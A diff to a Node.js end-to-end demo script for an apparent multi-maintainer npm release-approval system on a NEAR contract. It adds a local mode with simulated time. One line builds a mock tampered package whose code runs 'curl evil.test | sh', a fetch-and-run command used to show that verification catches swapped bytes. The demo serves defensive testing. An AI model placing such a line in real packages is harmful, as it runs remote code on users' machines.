@@ -1,15 +1,17 @@
-// End to end demo against the deployed testnet contract and a local mock npm
-// registry. It runs the real contract, the real CLI logic and the real worker
-// binary in direct publish mode. Only the registry is a mock.
+// End to end demo with a local mock npm registry. It runs the real contract, the
+// real CLI logic and the real worker binary in direct publish mode. Only the
+// registry is a mock.
 //
-//   node --env-file=.env cli/scripts/demo.mjs
+//   node cli/scripts/demo.mjs --local               no network, no NEAR account (real contract run natively)
+//   node --env-file=.env cli/scripts/demo.mjs       against the deployed testnet contract
 //
-// Needs: .env from setup-testnet.mjs, and the worker built (npm run build:worker).
+// Needs: the worker built (npm run build:worker). Testnet mode also needs .env from setup-testnet.mjs.
 
 import { existsSync } from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { NearChain } from '../src/chain.mjs';
+import { LocalNet } from '../src/localchain.mjs';
 import * as cmd from '../src/commands.mjs';
 import { startRegistry, totp } from '../../mock/registry.mjs';
 import { makePackage } from '../../mock/tarball.mjs';
@@ -19,11 +21,20 @@ const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..')
 const workerBin = path.join(root, 'worker/target/debug/keyturn-worker' + (process.platform === 'win32' ? '.exe' : ''));
 if (!existsSync(workerBin)) throw new Error('build the worker first: npm run build:worker');
 
+const local = process.argv.includes('--local');
 const need = (k) => process.env[k] || (() => { throw new Error(`${k} is missing in .env; run setup-testnet.mjs`); })();
-const contractId = need('KEYTURN_CONTRACT');
-const A = { ada: need('KEYTURN_ACCT_ADA'), bob: need('KEYTURN_ACCT_BOB'), cy: need('KEYTURN_ACCT_CY'),
-  ci: need('KEYTURN_ACCT_CI'), worker: need('KEYTURN_ACCT_WORKER'), watch: need('KEYTURN_ACCT_WATCH') };
-const as = (id) => new NearChain({ network: 'testnet', contractId, accountId: id, rpcUrl: process.env.KEYTURN_RPC });
+let net, contractId, A, as;
+if (local) {
+  net = new LocalNet({ worker: 'worker.local' });
+  contractId = 'keyturn.local (the real contract, run natively)';
+  A = { ada: 'ada.local', bob: 'bob.local', cy: 'cy.local', ci: 'ci.local', worker: 'worker.local', watch: 'watch.local' };
+  as = (id) => net.as(id);
+} else {
+  contractId = need('KEYTURN_CONTRACT');
+  A = { ada: need('KEYTURN_ACCT_ADA'), bob: need('KEYTURN_ACCT_BOB'), cy: need('KEYTURN_ACCT_CY'),
+    ci: need('KEYTURN_ACCT_CI'), worker: need('KEYTURN_ACCT_WORKER'), watch: need('KEYTURN_ACCT_WATCH') };
+  as = (id) => new NearChain({ network: 'testnet', contractId, accountId: id, rpcUrl: process.env.KEYTURN_RPC });
+}
 const chain = Object.fromEntries(Object.entries(A).map(([k, id]) => [k, as(id)]));
 
 const MOCK_BOT = 'mock-bot-token', MOCK_CI = 'mock-ci-token', MOCK_SECRET = 'GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ';
@@ -32,7 +43,7 @@ const runWorker = cmd.runWorkerBinary(workerBin, {
   NPM_TOKEN: MOCK_BOT, NPM_TOTP_SECRET: MOCK_SECRET, KEYTURN_NPM_REGISTRY: reg.url, KEYTURN_ALLOW_HTTP: '1',
 });
 
-const WINDOW_SECONDS = 20;
+const WINDOW_SECONDS = local ? 3600 : 20;
 const project = `npm:demo-${Date.now().toString(36)}`;
 const name = project.slice(4);
 let failures = 0;
@@ -52,7 +63,7 @@ async function expectRefused(promise, text) {
     say(`contract said: ${String(e.message || e).split('\n')[0].slice(0, 110)}`);
   }
 }
-const sleep = (s) => new Promise((r) => setTimeout(r, s * 1000));
+const sleep = (s) => (local ? Promise.resolve(net.advance(s * 1000)) : new Promise((r) => setTimeout(r, s * 1000)));
 const statusOf = async (version) => (await chain.ada.view('get_release', { project_id: project, version }))?.status;
 
 // CI builds the artifact, uploads it somewhere public, and proposes only its hash.
@@ -71,7 +82,7 @@ async function uploadAndPropose(version, source) {
 }
 
 try {
-  console.log(`contract ${contractId}\nproject  ${project}\nwindow   ${WINDOW_SECONDS}s (shortened for the demo)`);
+  console.log(`contract ${contractId}\nproject  ${project}\nwindow   ${local ? '1 hour, time is simulated' : WINDOW_SECONDS + 's (shortened for the demo)'}`);
 
   step('1. Register a project: 3 maintainers, 2 must approve, CI may only propose');
   await cmd.register(chain.ada, {
@@ -91,7 +102,7 @@ try {
   await cmd.approve(chain.bob, { project, version: '1.0.0' });
   check((await statusOf('1.0.0')) === 'Pending', 'quorum reached: release is Pending');
   await expectRefused(cmd.execute(chain.watch, { project, version: '1.0.0' }), 'execute is refused while the window is open');
-  say(`waiting ${WINDOW_SECONDS + 4}s for the window to close...`);
+  say(local ? 'the public window passes (simulated clock)' : `waiting ${WINDOW_SECONDS + 4}s for the window to close...`);
   await sleep(WINDOW_SECONDS + 4);
 
   step('4. Anyone triggers execution; the worker publishes only the approved bytes');
@@ -108,7 +119,7 @@ try {
   const v2 = await uploadAndPropose('1.0.1', 'module.exports = "v2";\n');
   await cmd.approve(chain.ada, { project, version: '1.0.1' });
   await cmd.approve(chain.cy, { project, version: '1.0.1' });
-  say(`waiting ${WINDOW_SECONDS + 4}s for the window to close...`);
+  say(local ? 'the public window passes (simulated clock)' : `waiting ${WINDOW_SECONDS + 4}s for the window to close...`);
   await sleep(WINDOW_SECONDS + 4);
   await cmd.execute(chain.watch, { project, version: '1.0.1' });
   const evil = makePackage(name, '1.0.1', "require('child_process').exec('curl evil.test | sh');\n");
@@ -129,6 +140,7 @@ try {
   check(!recalled.ok, `verify now fails: ${recalled.reason}`);
 } finally {
   await reg.close();
+  if (net) net.close();
 }
 
 console.log(failures === 0 ? '\nALL CHECKS PASSED' : `\n${failures} CHECK(S) FAILED`);
